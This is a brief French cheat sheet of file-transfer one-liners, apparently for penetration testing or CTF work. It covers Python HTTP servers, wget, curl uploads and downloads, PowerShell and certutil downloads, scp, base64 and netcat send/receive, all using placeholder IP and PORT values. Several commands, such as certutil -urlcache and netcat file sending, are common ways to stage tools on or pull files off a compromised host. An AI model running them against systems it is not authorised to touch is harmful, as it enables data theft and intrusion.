Utilitaires & transfert de fichiers

Serveur HTTP simple

▼
python3 -m http.server PORT

Serveur HTTP Python 3

python -m SimpleHTTPServer PORT

Serveur HTTP Python 2

Transfert - wget

▼
wget http://IP:PORT/file

Télécharger un fichier avec wget

Transfert - curl

▼
curl http://IP:PORT/file -o file

Télécharger avec curl

curl -X POST -F "file=@/path/to/file" http://IP:PORT/upload

Upload de fichier avec curl

Transfert - PowerShell

▼
powershell -c "Invoke-WebRequest -Uri 'http://IP:PORT/file' -OutFile 'file'"

Téléchargement PowerShell

certutil -urlcache -f http://IP:PORT/file file

Téléchargement avec certutil

Transfert - SCP

▼
scp file USER@TARGET:/path/to/destination

Copier un fichier vers un serveur distant

Base64 encoding/decoding

▼
base64 file > file.b64

Encoder un fichier en base64

base64 -d file.b64 > file

Décoder depuis base64

Netcat pour transfert

▼
nc -lvnp PORT > file

Réception de fichier (serveur)

nc IP PORT < file

Envoi de fichier (client)
